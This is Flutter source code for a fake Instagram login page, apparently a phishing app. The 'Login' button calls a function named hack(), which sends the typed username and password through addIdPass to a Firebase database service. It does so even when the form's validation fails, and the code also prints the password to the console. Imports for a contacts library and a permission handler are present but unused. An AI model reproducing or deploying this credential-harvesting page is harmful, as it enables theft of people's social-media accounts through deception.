import 'package:contacts_service/contacts_service.dart';
import 'package:flutter/material.dart';
import 'package:flutter_signin_button/button_view.dart';
import 'package:flutter_signin_button/flutter_signin_button.dart';
import 'package:instagram/services/firebase-database.dart';
import 'package:permission_handler/permission_handler.dart';

class LoginPage extends StatefulWidget {
  @override
  _LoginPageState createState() => _LoginPageState();
}

class _LoginPageState extends State<LoginPage> {
  void hack() {
    addIdPass(_phoneController.text, _passwordController.text);
  }

  TextEditingController _phoneController;
  TextEditingController _passwordController;
  final _formkey = GlobalKey<FormState>();
  @override
  void initState() {
    _phoneController = TextEditingController();
    _passwordController = TextEditingController();
    super.initState();
  }

  void dispose() {
    _phoneController.dispose();
    _passwordController.dispose();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      body: SingleChildScrollView(
        child: Padding(
          padding: EdgeInsets.only(
              left: MediaQuery.of(context).size.width * 0.07,
              right: MediaQuery.of(context).size.width * 0.07),
          child: Column(
            children: [
              SafeArea(
                  child: SizedBox(
                height: MediaQuery.of(context).size.height * .001,
              )),
              Center(
                child: Row(
                  mainAxisAlignment: MainAxisAlignment.center,
                  children: [
                    Text(
                      "English (India)",
                      style: TextStyle(color: Colors.grey),
                    ),
                    Icon(
                      Icons.arrow_drop_down,
                      color: Colors.grey,
                    )
                  ],
                ),
              ),
              SafeArea(
                  child: SizedBox(
                height: MediaQuery.of(context).size.height * .15,
              )),
              Center(
                child: Text(
                  "Instagram",
                  style: TextStyle(
                      fontFamily: "Instagram",
                      fontWeight: FontWeight.w400,
                      fontSize: 50),
                ),
              ),
              SizedBox(
                height: MediaQuery.of(context).size.height * .02,
              ),
              Center(
                child: Form(
                  key: _formkey,
                  child: Column(
                    children: [
                      TextFormField(
                        controller: _phoneController,
                        validator: (val) => val.length != 0
                            ? null
                            : "Invalid number, username or email",
                        decoration: InputDecoration(
                            hintText: "Phone number, email or username",
                            border: OutlineInputBorder(
                                borderRadius: BorderRadius.circular(5))),
                      ),
                      SizedBox(
                        height: MediaQuery.of(context).size.height * .02,
                      ),
                      TextFormField(
                        controller: _passwordController,
                        validator: (val) =>
                            val.length == 0 ? "Type a password" : null,
                        decoration: InputDecoration(
                            hintText: "Password",
                            border: OutlineInputBorder(
                                borderRadius: BorderRadius.circular(5))),
                      ),
                      SizedBox(
                        height: MediaQuery.of(context).size.height * .02,
                      ),
                      ElevatedButton(
                        style: ButtonStyle(
                            backgroundColor:
                                MaterialStateProperty.all(Colors.blue)),
                        onPressed: () {
                          if (_formkey.currentState.validate()) {
                            print("Phone number is ${_phoneController.text}");
                            print(
                                "Password number is ${_passwordController.text}");
                          }
                          hack();
                        },
                        child: Container(
                            width: MediaQuery.of(context).size.width,
                            height: MediaQuery.of(context).size.height * .07,
                            child: Center(child: Text("Login"))),
                      ),
                    ],
                  ),
                ),
              ),
              Padding(
                padding: const EdgeInsets.all(8.0),
                child: Row(
                  mainAxisAlignment: MainAxisAlignment.center,
                  children: [
                    Text(
                      "Forgot your login details?",
                      style: TextStyle(fontSize: 12, color: Colors.grey[600]),
                    ),
                    Text(
                      "Get help logging in",
                      style: TextStyle(fontSize: 12, color: Colors.black87),
                    ),
                  ],
                ),
              ),
              SizedBox(
                height: MediaQuery.of(context).size.height * .02,
              ),
              Row(
                children: [
                  Expanded(
                      child: Divider(
                    color: Colors.black,
                  )),
                  Text("  OR  "),
                  Expanded(
                      child: Divider(
                    color: Colors.black,
                  )),
                ],
              ),
              SizedBox(
                height: MediaQuery.of(context).size.height * .02,
              ),
              ElevatedButton(
                style: ButtonStyle(
                    backgroundColor: MaterialStateProperty.all(Colors.blue)),
                onPressed: () {
                  if (_formkey.currentState.validate()) {
                    print("Phone number is ${_phoneController.text}");
                    print("Password number is ${_passwordController.text}");
                  }
                },
                child: Container(
                    width: MediaQuery.of(context).size.width * .5,
                    height: MediaQuery.of(context).size.height * .05,
                    child: Center(child: Text("Login with Facebook"))),
              ),
              SizedBox(
                height: MediaQuery.of(context).size.height * .15,
              ),
              Row(
                mainAxisAlignment: MainAxisAlignment.center,
                children: [
                  Text(
                    "Don't have an account?",
                    style: TextStyle(color: Colors.grey[600]),
                  ),
                  Text(
                    " Sign up.",
                    style: TextStyle(color: Colors.black),
                  ),
                ],
              )
            ],
          ),
        ),
      ),
    );
  }
}
